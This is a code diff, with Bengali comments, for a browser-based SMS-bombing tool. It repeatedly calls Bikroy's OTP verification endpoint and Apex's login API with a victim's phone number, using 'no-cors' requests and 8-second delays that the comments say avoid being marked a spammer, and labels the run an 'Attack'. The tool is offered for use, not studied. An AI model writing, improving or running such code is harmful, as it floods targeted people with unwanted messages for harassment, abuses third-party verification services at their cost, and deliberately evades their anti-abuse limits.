@@ -1,5 +1,6 @@
 let isCooldown = false; 
 
+// ১. টাইমার চেক (পেজ লোড হওয়ার সময়)
 window.onload = function() {
     const savedCooldownTime = localStorage.getItem('cooldownEndTime');
     if (savedCooldownTime) {
@@ -19,20 +20,19 @@ async function startProcess() {
     if (isCooldown) { display.innerText = "Wait for cooldown!"; return; }
     if(!target || !count) { display.innerText = "Enter number & amount!"; return; }
 
-    display.innerText = "Starting 100% Success Attack...";
+    display.innerText = "Attack Started (Apex + Bikroy)...";
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // লজিক ১: ১ নম্বর সিরিয়ালে Bikroy (GET)
+            // লজিক: একবার Bikroy এবং একবার Apex কল হবে
             if (i % 2 !== 0) {
+                // Bikroy (GET)
                 await fetch(`https://bikroy.com/data/phone_number_verification/otp?phone=${target}`, {
                     method: 'GET',
-                    mode: 'no-cors', // ব্রাউজার লেভেল ব্লক এড়াতে
-                    cache: 'no-store'
+                    mode: 'no-cors' // CORS ইস্যু এড়াতে
                 });
-            } 
-            // লজিক ২: ২ নম্বর সিরিয়ালে Apex (POST)
-            else {
+            } else {
+                // Apex (POST)
                 await fetch('https://api.apex4u.com/api/auth/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -41,17 +41,17 @@ async function startProcess() {
                 });
             }
 
-            display.innerText = "Status: Sent " + i + " of " + count;
+            display.innerText = "Sent Request: " + i;
             
-            // ১০০% এসএমএস নিশ্চিত করার মূল গোপন উপায়: ৮ সেকেন্ড বিরতি
-            // এতে সার্ভার আপনাকে 'Spammer' হিসেবে চিহ্নিত করবে না
+            // ৮ সেকেন্ড বিরতি (এসএমএস নিশ্চিত করতে সবচেয়ে জরুরি)
             await new Promise(res => setTimeout(res, 8000)); 
             
         } catch (e) {
-            console.log("Request " + i + " failed, retrying next...");
+            console.log("Error in step " + i);
         }
     }
 
+    // ২. কাজ শেষে ৬০ সেকেন্ডের কুলডাউন
     const cooldownEndTime = Date.now() + 60000;
     localStorage.setItem('cooldownEndTime', cooldownEndTime);
     activateCooldown(60);
@@ -72,7 +72,7 @@ function activateCooldown(seconds) {
     }, 1000);
 }
 
-// Matrix Animation (অপরিবর্তিত)
+// ৩. ম্যাট্রিক্স অ্যানিমেশন (অপরিবর্তিত)
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth; canvas.height = window.innerHeight;
